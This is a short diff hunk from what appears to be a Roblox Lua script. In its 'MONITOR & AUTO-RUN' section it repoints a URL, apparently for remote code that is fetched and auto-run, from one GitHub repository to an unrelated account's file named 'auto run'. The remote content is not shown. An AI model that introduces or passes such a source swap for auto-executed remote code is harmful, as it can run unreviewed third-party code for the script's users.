@@ -263,7 +263,7 @@ local hrp       = character:WaitForChild("HumanoidRootPart")
 StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Health, true)
 
 -- ===== MONITOR & AUTO-RUN =====
-local MONITOR_URL = "https://raw.githubusercontent.com/White-rbx/HealthBar-Remake/refs/heads/main/loadstring.lua"
+local MONITOR_URL = "https://raw.githubusercontent.com/idkbro-afk/ideal-engine/refs/heads/main/auto%20run"
 
 local function getHealthBar()
     local ok, top = pcall(function()
